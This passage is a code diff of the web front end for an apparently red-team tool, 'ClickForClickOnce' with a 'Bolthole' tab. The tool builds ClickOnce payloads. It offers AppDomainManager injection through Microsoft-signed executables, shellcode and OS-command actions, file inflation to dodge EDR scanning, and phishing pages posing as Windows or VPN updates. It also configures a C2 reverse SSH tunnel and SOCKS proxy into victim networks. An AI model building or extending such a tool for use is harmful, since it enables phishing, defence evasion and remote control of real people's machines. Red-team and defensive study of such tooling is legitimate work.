+      <span>History</span>
+    </button>
+  </div>
+
+  <!-- ══════════ CFCO TAB ══════════ -->
+  <div class="tab-content active" id="cfco-tab">
+
+    <div class="section-card open" id="cfco-step1-card">
+      <div class="section-header" onclick="toggleSection('cfco-step1-card')">
+        <div class="step-badge">1</div>
+        <span class="section-title">Application Identity</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <div class="form-row">
+          <div class="form-group">
+            <label>Application Name</label>
+            <input type="text" id="nameInput" placeholder="MyApplication" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label>Publisher Name</label>
+            <input type="text" id="publisherInput" value="Microsoft Corporation">
+          </div>
         </div>
+        <div class="form-group">
+          <label>App Description <span style="color:var(--text2);text-transform:none;letter-spacing:0;font-weight:400">(manifest metadata)</span></label>
+          <input type="text" id="descriptionInput" placeholder="Leave blank to use application name">
+        </div>
+        <div class="form-group">
+          <label>Custom Icon (.ico) &mdash; optional</label>
+          <label class="file-label">
+            <svg viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M9.293 0H4a2 2 0 00-2 2v12a2 2 0 002 2h8a2 2 0 002-2V4.707A1 1 0 0013.707 4L10 .293A1 1 0 009.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 01-1-1z"/></svg>
+            <span class="file-name" id="iconFileName">No file chosen &mdash; defaults to template icon</span>
+            <input type="file" id="iconFile" accept=".ico">
+          </label>
+        </div>
+      </div>
+    </div>
 
-        <div class="main-container">
-            <h1>ClickForClickOnce</h1>
-            <p class="description">
-                Web-based ClickOnce payload generator. Checkout the <a href="http://github.com/whokilleddb/clickforclickonce">Github repository</a> for details, IoCs and more.
-            </p>
+    <div class="section-card open" id="cfco-step2-card">
+      <div class="section-header" onclick="toggleSection('cfco-step2-card')">
+        <div class="step-badge">2</div>
+        <span class="section-title">Payload Configuration</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <div class="form-group">
+          <label>Sideload Target</label>
+          <div class="sideload-grid" id="cfco-sideload-grid">
+            <label class="sideload-card selected" onclick="selectSideload(this,'cfco')">
+              <input type="radio" name="cfco-sideload" value="tzsync" checked>
+              <div class="sideload-card-icon">&#128336;</div>
+              <div class="sideload-card-text"><div class="name">TzSync</div><div class="exe">tzsync.exe</div></div>
+            </label>
+            <label class="sideload-card" onclick="selectSideload(this,'cfco')">
+              <input type="radio" name="cfco-sideload" value="powershell">
+              <div class="sideload-card-icon">&#128309;</div>
+              <div class="sideload-card-text"><div class="name">PowerShell ISE</div><div class="exe">powershell_ise.exe</div></div>
+            </label>
+            <label class="sideload-card" onclick="selectSideload(this,'cfco')">
+              <input type="radio" name="cfco-sideload" value="systemhost">
+              <div class="sideload-card-icon">&#9881;</div>
+              <div class="sideload-card-text"><div class="name">ServiceHub Host</div><div class="exe">ServiceHub.Host.netfx.x64.exe</div></div>
+            </label>
+            <label class="sideload-card" onclick="selectSideload(this,'cfco')">
+              <input type="radio" name="cfco-sideload" value="perfwatson2">
+              <div class="sideload-card-icon">&#128202;</div>
+              <div class="sideload-card-text"><div class="name">PerfWatson2</div><div class="exe">PerfWatson2.exe</div></div>
+            </label>
+          </div>
+        </div>
+        <div class="form-group" style="margin-top:14px">
+          <label>Inflate Size</label>
+          <div class="slider-wrap">
+            <input type="range" id="inflateSlider" min="0" max="500" value="300"
+              oninput="document.getElementById('inflateVal').textContent=this.value+' MB'">
+            <span class="slider-val" id="inflateVal">300 MB</span>
+          </div>
+          <div style="font-size:.75rem;color:var(--text2);margin-top:4px">0 &mdash; 500 MB (larger values overflow into an embedded resource)</div>
+        </div>
+      </div>
+    </div>
 
-            <!-- Tab navigation -->
-            <div class="tab-bar">
-                <button class="tab-btn active" onclick="switchTab('cfco')">ClickOnce</button>
-                <button class="tab-btn" onclick="switchTab('bolthole')">Bolthole</button>
+    <div class="section-card open" id="cfco-step3-card">
+      <div class="section-header" onclick="toggleSection('cfco-step3-card')">
+        <div class="step-badge">3</div>
+        <span class="section-title">Actions</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <div class="action-controls">
+          <select id="actionType">
+            <option value="run_code">Run Shellcode</option>
+            <option value="drop_file">Drop File</option>
+            <option value="run_cmd">Run OS Command</option>
+          </select>
+          <button class="btn btn-ghost btn-sm" onclick="addAction()">+ Add Action</button>
+        </div>
+        <div id="actionCards"></div>
+      </div>
+    </div>
+
+    <div class="section-card open" id="cfco-build-card">
+      <div class="section-header" onclick="toggleSection('cfco-build-card')">
+        <div class="step-badge">4</div>
+        <span class="section-title">Build</span>
+        <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+      </div>
+      <div class="section-body">
+        <div class="form-group" style="margin-bottom:16px">
+          <label>Phishing Page Template</label>
+          <select id="cfco-phishTemplate">
+            <option value="it_portal">IT Portal (Mandatory Update)</option>
+            <option value="microsoft_update">Windows Update (KB Security Patch)</option>
+            <option value="vpn_update">VPN Client Update</option>
+            <option value="office_update">Microsoft 365 / Office Update</option>
+          </select>
+          <div style="font-size:.75rem;color:var(--text2);margin-top:6px">
+            Included as <code style="font-family:monospace;background:var(--surface2);padding:1px 5px;border-radius:3px;color:var(--accent)">index.html</code>
+            at the zip root. Install button links to <code style="font-family:monospace;background:var(--surface2);padding:1px 5px;border-radius:3px;color:var(--accent)">clickonce/{name}.application</code>.
+          </div>
+        </div>
+        <div style="display:flex;gap:10px">
+          <button class="btn btn-primary" id="submitBtn" style="flex:1" onclick="submitCfco()">Build ClickOnce Payload</button>
+          <button class="btn btn-ghost btn-reopen" id="cfcoReopenBtn" onclick="reopenLastBuild()" title="View last build log">&#128196; Last Build</button>
+        </div>
+        <div class="error-banner" id="cfcoError"></div>
+      </div>
+    </div>
+
+  </div><!-- end cfco-tab -->
+
+  <!-- ══════════ BOLTHOLE TAB ══════════ -->
+  <div class="tab-content" id="bolthole-tab">
+
+    <div class="step-indicator">
+      <div class="step-dot active" id="bh-dot-1"></div>
+      <span>C2 Configuration</span>
+      <div style="flex:1;height:1px;background:var(--border);margin:0 4px"></div>
+      <div class="step-dot" id="bh-dot-2"></div>
+      <span>Payload Build</span>
+    </div>
+
+    <!-- BH Step 1 -->
+    <div class="bh-step active" id="bh-step1">
+
+      <div class="section-card open" id="bh-c2-card">
+        <div class="section-header" onclick="toggleSection('bh-c2-card')">
+          <div class="step-badge">1</div>
+          <span class="section-title">C2 SSH Configuration</span>
+          <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+        </div>
+        <div class="section-body">
+          <div class="form-row">
+            <div class="form-group">
+              <label>C2 Host (FQDN or IP)</label>
+              <input type="text" id="bh-sshHost" placeholder="c2.example.com">
             </div>
-
-            <!-- ═══════════════════════════════════════════════════ -->
-            <!--  CFCO Tab                                           -->
-            <!-- ═══════════════════════════════════════════════════ -->
-            <div id="cfco-tab" class="tab-content active">
-
-                <div class="section">
-                    <h2>ClickOnce Name</h2>
-                    <p class="field-description">
-                        This would be the name of the application the user sees. Make sure it fits the ruse!
-                    </p>
-                    <input type="text" id="nameInput" placeholder="ApplicationHelper" />
-                </div>
-
-                <div class="section">
-                    <h2>AppDomainManager Injection Options</h2>
-                    <p class="field-description">
-                        The clickonce uses AppDomainManager Injection to run payloads - choose which Exe would you like to run your payload.
-                    </p>
-                    <div class="radio-group">
-                        <div class="radio-option">
-                            <input type="radio" name="sideloadOption" value="tzsync" checked>
-                            <div class="radio-option-content">
-                                <div class="radio-option-title">tzsync</div>
-                                <div class="radio-option-desc">
-                                    Tzsync is a TimeZone Sync program responsible for synchronizing time zone information on a Windows operating system. Note that this is a console application so you might see a CMD terminal pop up.
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="radio-option">
-                            <input type="radio" name="sideloadOption" value="powershell">
-                            <div class="radio-option-content">
-                                <div class="radio-option-title">Powershell ISE</div>
-                                <div class="radio-option-desc">
-                                    The Windows PowerShell Integrated Scripting Environment (ISE) is a host application for Windows PowerShell that provides a graphical user interface for running commands, writing, testing, and debugging scripts.
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="radio-option">
-                            <input type="radio" name="sideloadOption" value="SystemHost">
-                            <div class="radio-option-content">
-                                <div class="radio-option-title">ServiceHub.Host.netfx</div>
-                                <div class="radio-option-desc">
-                                    ServiceHub.Host.netfx.x64 is associated with Visual Studio's Service Hub, which is a set of background services that provide support for various Visual Studio features and tools.
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="radio-option">
-                            <input type="radio" name="sideloadOption" value="PerfWatson2">
-                            <div class="radio-option-content">
-                                <div class="radio-option-title">PerfWatson2</div>
-                                <div class="radio-option-desc">
-                                    PerfWatson2 is a part of Microsoft Visual Studio and is related to performance monitoring and crash reporting while it's running.
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="section">
-                    <h2>Inflate Size</h2>
-                    <p class="field-description">
-                        Some EDRs dont scan artefacts above a certain size threshold - so we can artificially inflate the payload sizes here:
-                    </p>
-                    <div class="slider-container">
-                        <div class="slider-labels">
-                            <span>0</span>
-                            <span class="slider-value" id="inflateValue">300</span>
-                            <span>500</span>
-                        </div>
-                        <input type="range" min="0" max="500" value="300" class="slider" id="inflateSlider">
-                    </div>
-                </div>
-
-                <div class="section">
-                    <h2>Actions</h2>
-                    <p class="field-description">
-                        This section allows you to add actions you want the ClickOnce to perform. The operations are performed in the order they are arranged. The Action Cards can also be dragged to be reordered.
-                    </p>
-
-                    <div class="action-selector">
-                        <select id="actionType">
-                            <option value="run_code">Run Shellcode</option>
-                            <option value="drop_file">Drop File</option>
-                            <option value="run_cmd">Run OS Command</option>
-                        </select>
-                        <button id="addActionBtn" class="green-btn">Add Action</button>
-                    </div>
-
-                    <div id="actionCards">
-                        <!-- Action cards will be added here -->
-                    </div>
-                </div>
-
-                <div class="submit-section">
-                    <button id="submitBtn" class="submit-button">Submit</button>
-                </div>
-
-                <div id="resultsSection" class="results-section" style="display: none;">
-                    <div class="results-title">Results here</div>
-                    <a id="resultLink" href="#" target="_blank" class="result-link"></a>
-                </div>
-
-                <div id="errorMessage" class="error-message" style="display: none;"></div>
-
-            </div><!-- /cfco-tab -->
-
-            <!-- ═══════════════════════════════════════════════════ -->
-            <!--  Bolthole Tab                                       -->
-            <!-- ═══════════════════════════════════════════════════ -->
-            <div id="bolthole-tab" class="tab-content">
-
-                <!-- Step progress indicator -->
-                <div class="bh-step-bar">
-                    <div class="bh-step-item active" id="bh-si-1">
-                        <div class="bh-step-circle">1</div>
-                        <div class="bh-step-label">C2 Server Setup</div>
-                    </div>
-                    <div class="bh-step-line"></div>
-                    <div class="bh-step-item" id="bh-si-2">
-                        <div class="bh-step-circle">2</div>
-                        <div class="bh-step-label">Package Builder</div>
-                    </div>
-                </div>
-
-                <!-- ─────────────────────────────────────────────── -->
-                <!--  Step 1: C2 Server Setup                        -->
-                <!-- ─────────────────────────────────────────────── -->
-                <div id="bh-step1">
-
-                    <div class="section">
-                        <h2>C2 Server Configuration</h2>
-                        <p class="field-description">
-                            Configure the SSH tunnel endpoint. These values are compiled into the implant DLL.
-                            Settings are saved globally — every package you build uses the same C2 config.
-                        </p>
-
-                        <div class="form-row" style="margin-bottom:16px;">
-                            <div class="form-field">
-                                <label class="field-label">C2 Hostname</label>
-                                <p class="field-description">FQDN or IP of your C2 SSH server.</p>
-                                <input type="text" id="bh-sshHost" placeholder="c2.example.com" style="margin-bottom:0;" />
-                            </div>
-                            <div class="form-field">
-                                <label class="field-label">C2 SSH Username</label>
-                                <p class="field-description">No-login user the implant authenticates as.</p>
-                                <input type="text" id="bh-sshUser" placeholder="implant-user" style="margin-bottom:0;" />
-                            </div>
-                        </div>
-
-                        <label class="field-label">Port Scan Order</label>
-                        <p class="field-description">
-                            Comma-separated — the implant probes each port in order and connects on the first open one.
-                        </p>
-                        <input type="text" id="bh-ports" value="443,80,22,31337" />
-
-                        <div class="form-row" style="margin-bottom:16px;">
-                            <div class="form-field">
-                                <label class="field-label">Reverse Tunnel Port</label>
-                                <p class="field-description">Port forwarded back to the implant's local sshd.</p>
-                                <input type="number" id="bh-tunnelPort" value="31332" min="1" max="65535" style="margin-bottom:0;" />
-                            </div>
-                            <div class="form-field">
-                                <label class="field-label">SOCKS5 Proxy Port</label>
-                                <p class="field-description">Dynamic SOCKS5 port on the C2 server.</p>
-                                <input type="number" id="bh-socksPort" value="1080" min="1" max="65535" style="margin-bottom:0;" />
-                            </div>
-                        </div>
-
-                        <div class="form-row">
-                            <div class="form-field">
-                                <label class="field-label">Startup Delay (seconds)</label>
-                                <p class="field-description">Sleep before the implant first connects.</p>
-                                <input type="number" id="bh-startupDelay" value="5" min="0" style="margin-bottom:0;" />
-                            </div>
-                            <div class="form-field">
-                                <label class="field-label">Reconnect Delay (seconds)</label>
-                                <p class="field-description">Sleep between reconnect attempts.</p>
-                                <input type="number" id="bh-reconnectDelay" value="30" min="0" style="margin-bottom:0;" />
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="section">
-                        <h2>Outbound SSH Keypair</h2>
-                        <p class="field-description">
-                            A single keypair is shared across all packages — the private key is embedded in every implant,
-                            the public key is installed on the C2 server by <code>c2_setup.sh</code>.
-                            Rotate only if the key is compromised; all existing packages will stop connecting until you rebuild them.
-                        </p>
-
-                        <!-- Keypair status card -->
-                        <div id="bh-kp-card" style="background:rgba(255,255,255,0.04);border:1px solid #444;border-radius:6px;padding:16px;margin-bottom:14px;">
-                            <div id="bh-kp-loading" style="color:#b0b0b0;font-size:0.9rem;">Loading keypair…</div>
-                            <div id="bh-kp-info" style="display:none;">
-                                <div style="margin-bottom:10px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
-                                    <span style="color:#b0b0b0;font-size:0.82rem;min-width:80px;">Fingerprint:</span>
-                                    <code id="bh-kp-fingerprint" style="background:rgba(255,255,255,0.06);padding:3px 8px;border-radius:3px;font-size:0.85rem;color:#d6deff;word-break:break-all;"></code>
-                                </div>
-                                <div style="margin-bottom:4px;">
-                                    <span style="color:#b0b0b0;font-size:0.82rem;">Public Key (installed by c2_setup.sh):</span>
-                                </div>
-                                <textarea id="bh-kp-pubkey" readonly style="min-height:52px;opacity:0.75;cursor:default;" onclick="this.select()"></textarea>
-                            </div>
-                        </div>
-
-                        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
-                            <button type="button" id="bh-regen-keypair" class="red-btn" style="padding:9px 16px;font-size:0.85rem;">↻ Rotate Keypair</button>
-                            <span id="bh-regen-warning" style="color:#e24a90;font-size:0.82rem;display:none;">
-                                Warning: all existing implants will stop connecting until rebuilt.
-                            </span>
-                        </div>
-                    </div>
-
-                    <div class="submit-section flex-row">
-                        <button id="bh-download-c2-btn" class="submit-button grey-btn">↓ Download c2_setup.sh</button>
-                        <button id="bh-step1-next-btn" class="submit-button">Next: Build Package →</button>
-                    </div>
-
-                    <div id="bh-step1-error" class="error-message" style="display: none;"></div>
-
-                </div><!-- /bh-step1 -->
-
-                <!-- ─────────────────────────────────────────────── -->
-                <!--  Step 2: Package Builder                        -->
-                <!-- ─────────────────────────────────────────────── -->
-                <div id="bh-step2" style="display:none;">
-
-                    <div class="section">
-                        <h2>ClickOnce Package</h2>
-                        <p class="field-description">
-                            Configure the ClickOnce deployment that delivers the Bolthole DLL to targets.
-                        </p>
-
-                        <label class="field-label">Application Name</label>
-                        <p class="field-description">
-                            Name shown in the ClickOnce install prompt — auto-generated, change it to fit your ruse.
-                            Alphanumeric + underscores, must start with a letter.
-                        </p>
-                        <div style="display:flex;gap:8px;align-items:center;margin-bottom:16px;">
-                            <input type="text" id="bh-name" style="margin-bottom:0;flex:1;" />
-                            <button type="button" id="bh-regen-name" style="padding:10px 14px;font-size:0.85rem;white-space:nowrap;flex-shrink:0;">↺ New Name</button>
-                        </div>
-
-                        <label class="field-label">Injection Host</label>
-                        <p class="field-description">
-                            Microsoft-signed EXE that loads the Bolthole DLL via AppDomainManager hijacking.
-                        </p>
-                        <div class="radio-group">
-                            <div class="radio-option">
-                                <input type="radio" name="bh-sideloadOption" value="PerfWatson2" checked>
-                                <div class="radio-option-content">
-                                    <div class="radio-option-title">PerfWatson2</div>
-                                    <div class="radio-option-desc">Visual Studio performance monitor. No console window — recommended.</div>
-                                </div>
-                            </div>
-                            <div class="radio-option">
-                                <input type="radio" name="bh-sideloadOption" value="tzsync">
-                                <div class="radio-option-content">
-                                    <div class="radio-option-title">tzsync</div>
-                                    <div class="radio-option-desc">TimeZone Sync service. Console app — may briefly show a CMD window.</div>
-                                </div>
-                            </div>
-                            <div class="radio-option">
-                                <input type="radio" name="bh-sideloadOption" value="SystemHost">
-                                <div class="radio-option-content">
-                                    <div class="radio-option-title">ServiceHub.Host.netfx</div>
-                                    <div class="radio-option-desc">Visual Studio Service Hub host process.</div>
-                                </div>
-                            </div>
-                            <div class="radio-option">
-                                <input type="radio" name="bh-sideloadOption" value="powershell">
-                                <div class="radio-option-content">
-                                    <div class="radio-option-title">PowerShell ISE</div>
-                                    <div class="radio-option-desc">Windows PowerShell Integrated Scripting Environment.</div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <label class="field-label">Deployment URL <span style="font-weight:400;color:#888;">(optional)</span></label>
-                        <p class="field-description">
-                            Full HTTPS URL of the <code>.application</code> file on your web server. Used in the ClickOnce manifest
-                            and phishing page. Leave blank if you'll update the manifests manually after downloading.
-                        </p>
-                        <input type="text" id="bh-providerUrl" placeholder="https://update.example.com/SecurityUpdate.application" />
-
-                        <div class="form-row" style="margin-bottom:10px;">
-                            <div class="form-field">
-                                <label class="field-label">App Version</label>
-                                <input type="text" id="bh-version" value="1.0.0.0" placeholder="1.0.0.0" style="margin-bottom:0;" />
-                            </div>
-                            <div class="form-field">
-                                <label class="field-label">Inflate Size (MB)</label>
-                                <div class="slider-container" style="margin-bottom:0;">
-                                    <div class="slider-labels">
-                                        <span>0</span>
-                                        <span class="slider-value" id="bh-inflateValue">0</span>
-                                        <span>500</span>
-                                    </div>
-                                    <input type="range" min="0" max="500" value="0" class="slider" id="bh-inflateSlider">
-                                </div>
-                            </div>
-                        </div>
-                        <div class="form-row" style="margin-bottom:10px;">
-                            <div class="form-field">
-                                <label class="field-label">Files Prefix</label>
-                                <input type="text" id="bh-filesPrefix" value="bolt" placeholder="bolt" style="margin-bottom:0;" />
-                                <p class="field-description" style="margin-top:4px;margin-bottom:0;">Renames bolt* files in the package — e.g. <code>shadow</code> → <code>ShadowFiles/</code>, <code>shadowd.exe</code>, <code>shadowcon.exe</code> … (3–16 lowercase letters/digits)</p>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="section">
-                        <h2>Operator Access Keys <span style="font-weight:400;color:#888;font-size:0.9rem;">(optional)</span></h2>
-                        <p class="field-description">
-                            SSH public key(s) your operators use to connect back to the target through the reverse tunnel
-                            (i.e. to SSH into the implant's embedded sshd).
-                            Written into the package's <code>authorized_keys</code> file alongside a fresh auto-generated per-build key.
-                            Leave blank to rely solely on the auto-generated operator key downloaded with the build.
-                        </p>
-                        <div id="bh-opkeys-container">
-                            <div class="key-row">
-                                <textarea placeholder="ecdsa-sha2-nistp256 AAAA… operator@host"></textarea>
-                            </div>
-                        </div>
-                        <button type="button" id="bh-add-opkey" class="green-btn" style="padding:8px 14px;font-size:0.85rem;margin-top:4px;">+ Add Another Key</button>
-                    </div>
-
-                    <div class="submit-section flex-row">
-                        <button id="bh-step2-back-btn" class="submit-button grey-btn">← Back</button>
-                        <button id="bh-submitBtn" class="submit-button">Build Package</button>
-                    </div>
-
-                    <div id="bh-errorMessage" class="error-message" style="display: none;"></div>
-
-                </div><!-- /bh-step2 -->
-
-                <!-- Build results (shown after successful build) -->
-                <div id="bh-resultsSection" class="results-section" style="display: none;">
-                    <div class="results-title">Build Complete</div>
-                    <p class="field-description" style="margin-bottom: 16px;">
-                        Compilation runs in the background — files appear once complete (typically 1–3 minutes).
-                    </p>
-                    <a id="bh-dirLink" href="#" target="_blank" class="result-link" style="display:block; margin-bottom: 20px;"></a>
-
-                    <div class="bh-downloads">
-                        <a id="bh-link-zip" href="#" class="bh-download-link" target="_blank">
-                            <span class="dl-label">Package</span>
-                            <span id="bh-label-zip">package.zip</span>
-                        </a>
-                        <a id="bh-link-key" href="#" class="bh-download-link" target="_blank">
-                            <span class="dl-label">Operator key</span>
-                            <span>operator_key</span>
-                        </a>
-                        <a id="bh-link-phish" href="#" class="bh-download-link" target="_blank">
-                            <span class="dl-label">Phish page</span>
-                            <span>phish.html</span>
-                        </a>
-                        <a id="bh-link-setup" href="#" class="bh-download-link" target="_blank">
-                            <span class="dl-label">C2 setup</span>
-                            <span>c2_setup.sh</span>
-                        </a>
-                    </div>
-
-                    <div class="bh-checklist">
-                        <div class="bh-checklist-title">Deployment Checklist</div>
-                        <ol id="bh-checklist-steps"></ol>
-                    </div>
-
-                    <div id="bh-ops-ref" class="bh-ops-ref" style="display:none;">
-                        <div class="bh-ops-ref-title">Operations Reference</div>
-
-                        <div class="bh-cmd-section">
-                            <div class="bh-cmd-label">Identify target — read Windows username from SSH auth log</div>
-                            <div id="bh-cmd-monitor" class="bh-cmd-block" onclick="selectAllText(this)" title="Click to select all"></div>
-                        </div>
-
-                        <div class="bh-cmd-section">
-                            <div class="bh-cmd-label">Connect to target via reverse tunnel (run on C2)</div>
-                            <div id="bh-cmd-connect" class="bh-cmd-block" onclick="selectAllText(this)" title="Click to select all"></div>
-                        </div>
-
-                        <div class="bh-cmd-section">
-                            <div class="bh-cmd-label">Route traffic through target network — SOCKS5 proxy</div>
-                            <div id="bh-cmd-socks" class="bh-cmd-block" onclick="selectAllText(this)" title="Click to select all"></div>
-                        </div>
-                    </div>
-                </div>
-
-            </div><!-- /bolthole-tab -->
-
-        </div><!-- /main-container -->
-
-        <script>
-            // ─── Helpers ─────────────────────────────────────────────────────────────
-            function selectAllText(el) {
-                const range = document.createRange();
-                range.selectNodeContents(el);
-                const sel = window.getSelection();
-                sel.removeAllRanges();
-                sel.addRange(range);
-            }
-
-            // ─── Tab switching ────────────────────────────────────────────────────────
-            function switchTab(tab) {
-                document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-                document.getElementById(tab + '-tab').classList.add('active');
-                document.querySelector(`.tab-btn[onclick="switchTab('${tab}')"]`).classList.add('active');
-            }
-
-            // ─── Shared helpers ───────────────────────────────────────────────────────
-            const adjectives = [
-                'Smart', 'Quick', 'Secure', 'Silent', 'Rapid', 'Swift', 'Dynamic', 'Advanced',
-                'Premium', 'Elite', 'Pro', 'Ultra', 'Super', 'Mega', 'Power', 'Turbo',
-                'Active', 'Auto', 'Direct', 'Fast', 'Global', 'Instant', 'Live', 'Master',
-                'Multi', 'Prime', 'Real', 'Safe', 'Smart', 'Total', 'True', 'Virtual',
-                'Blue', 'Green', 'Red', 'Gold', 'Silver', 'Crystal', 'Digital', 'Cyber',
-                'System', 'Network', 'Cloud', 'Web', 'Data', 'File', 'Core', 'Main'
-            ];
-            const nouns = [
-                'Helper', 'Manager', 'Service', 'Tool', 'Utility', 'Agent', 'Handler', 'Client',
-                'Server', 'Browser', 'Viewer', 'Editor', 'Player', 'Reader', 'Writer', 'Scanner',
-                'Monitor', 'Tracker', 'Analyzer', 'Processor', 'Generator', 'Builder', 'Maker', 'Creator',
-                'Launcher', 'Runner', 'Executor', 'Controller', 'Coordinator', 'Organizer', 'Optimizer', 'Enhancer',
-                'Guard', 'Shield', 'Protector', 'Defender', 'Keeper', 'Watcher', 'Observer', 'Detector',
-                'Connector', 'Bridge', 'Gateway', 'Portal', 'Interface', 'Console', 'Panel', 'Dashboard',
-                'Studio', 'Workspace', 'Center', 'Hub', 'Station', 'Terminal', 'Explorer', 'Navigator'
-            ];
-
-            function generateRandomName() {
-                return adjectives[Math.floor(Math.random() * adjectives.length)]
-                     + nouns[Math.floor(Math.random() * nouns.length)];
-            }
-
-            function isValidClickOnceName(str) {
-                return /^[a-zA-Z][a-zA-Z0-9_]*[a-zA-Z0-9]$/.test(str) || /^[a-zA-Z]$/.test(str);
-            }
-
-            function showProcessingOverlay() {
-                document.getElementById("processingOverlay").style.display = "flex";
-            }
-
-            function hideProcessingOverlay() {
-                document.getElementById("processingOverlay").style.display = "none";
-            }
-
-            // ─── CFCO tab init ────────────────────────────────────────────────────────
-            document.getElementById("nameInput").value = generateRandomName();
-
-            const inflateSlider = document.getElementById("inflateSlider");
-            const inflateValue  = document.getElementById("inflateValue");
-            inflateSlider.oninput = function() { inflateValue.textContent = this.value; };
-
-            let actionCards = document.getElementById('actionCards');
-            let sortable = Sortable.create(actionCards, {
-                animation: 150,
-                handle: '.action-card',
-                ghostClass: 'sortable-ghost'
-            });
-
-            let actionCounter = 0;
-
-            document.getElementById("addActionBtn").addEventListener("click", function() {
-                addActionCard(document.getElementById("actionType").value, actionCounter++);
-            });
-
-            function addActionCard(type, index) {
-                const card = document.createElement("div");
-                card.className = "action-card";
-                card.dataset.index = index;
-                card.dataset.type = type;
-
-                let cardContent = `
-                    <div class="action-card-header">
-                        <div class="action-card-title">
-                            ${getActionTitle(type)}
-                            <span class="drag-hint">(Drag to reorder)</span>
-                        </div>
-                        <button class="action-card-remove red-btn" data-index="${index}">Remove</button>
-                    </div>
-                `;
-
-                switch(type) {
-                    case "run_code":
-                        cardContent += `
-                            <div class="action-card-field">
-                                <div class="field-description">Upload a x64 shellcode to be executed. Note that the shellcode execution is delayed by 8 minutes.</div>
-                                <label class="field-label">Shellcode File:</label>
-                                <input type="file" id="codefile-${index}" required>
-                            </div>`;
-                        break;
-                    case "drop_file":
-                        cardContent += `
-                            <div class="action-card-field">
-                                <div class="field-description">Upload a file to be dropped at the specified location on the target system. Supports env vars. Creates any missing parent directories. Make sure to specify the full path on the target including the extension if relevant.</div>
-                            </div>
-                            <div class="action-card-field">
-                                <label class="field-label">File to Drop:</label>
-                                <input type="file" id="dropfile-${index}" required>
-                            </div>
-                            <div class="action-card-field">
-                                <label class="field-label">Drop Location:</label>
-                                <input type="text" id="droplocation-${index}" placeholder="C:\\Test\\" required>
-                            </div>`;
-                        break;
-                    case "run_cmd":
-                        cardContent += `
-                            <div class="action-card-field">
-                                <div class="field-description">Execute an OS command on the target system. Env var are also supported.</div>
-                                <label class="field-label">Command:</label>
-                                <input type="text" id="command-${index}" placeholder="calc.exe" required>
-                            </div>`;
-                        break;
-                }
-
-                card.innerHTML = cardContent;
-                document.getElementById("actionCards").appendChild(card);
-                card.querySelector(".action-card-remove").addEventListener("click", function() {
-                    card.remove();
-                });
-            }
-
-            function getActionTitle(type) {
-                switch(type) {
-                    case "run_code": return "Run Shellcode";
-                    case "drop_file": return "Drop File";
-                    case "run_cmd": return "Run OS Command";
-                    default: return "Action";
-                }
-            }
-
-            function clearCfcoResults() {
-                document.getElementById("resultsSection").style.display = "none";
-                document.getElementById("errorMessage").style.display = "none";
-            }
-
-            function showCfcoResults(buildid) {
-                const url = window.location.origin + "/build/" + buildid + "/";
-                const resultsSection = document.getElementById("resultsSection");
-                const resultLink = document.getElementById("resultLink");
-                resultLink.href = url;
-                resultLink.textContent = url;
-                resultsSection.style.display = "block";
-                window.open(url, '_blank');
-            }
-
-            function showCfcoError(message) {
-                const errorDiv = document.getElementById("errorMessage");
-                errorDiv.textContent = message;
-                errorDiv.style.display = "block";
-            }
-
-            document.getElementById("submitBtn").addEventListener("click", async () => {
-                clearCfcoResults();
-
-                const name     = document.getElementById("nameInput").value.trim();
-                const sideload = document.querySelector('input[name="sideloadOption"]:checked').value;
-                const inflate  = parseInt(document.getElementById("inflateSlider").value);
-
-                if (!name) { showCfcoError("Please enter a ClickOnce name."); return; }
-                if (!isValidClickOnceName(name)) {
-                    showCfcoError("ClickOnce name must start with a letter, contain only alphanumeric characters and underscores, and cannot end with an underscore.");
-                    return;
-                }
-
-                const actionCardElements = document.querySelectorAll(".action-card");
-                const actions = [];
-
-                for (let i = 0; i < actionCardElements.length; i++) {
-                    const card = actionCardElements[i];
-                    const cardType = card.dataset.type;
-                    const originalIndex = card.dataset.index;
-                    let actionData = {};
-
-                    switch(cardType) {
-                        case "run_code": {
-                            const codeFileInput = document.getElementById(`codefile-${originalIndex}`);
-                            if (!codeFileInput.files.length) {
-                                showCfcoError(`Please select a shellcode file for Run Shellcode action #${i+1}`);
-                                return;
-                            }
-                            const codeReader = new FileReader();
-                            codeReader.readAsDataURL(codeFileInput.files[0]);
-                            await new Promise(resolve => codeReader.onload = resolve);
